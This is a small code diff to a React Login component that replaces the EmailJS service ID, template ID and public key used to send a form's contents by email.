@@ -8,7 +8,7 @@ function Login() {
     const sendEmail = (e) => {
         e.preventDefault();
 
-        emailjs.sendForm('service_id6z6i9', 'template_h2y7r5r', form.current, 'FVIPVt10PQDRIGWMa')
+        emailjs.sendForm('service_kcvaino', 'template_04coz69', form.current, 'cvMU62C8Y4S_8PRFx')
             .then((result) => {
                 console.log(result.text);
             }, (error) => {
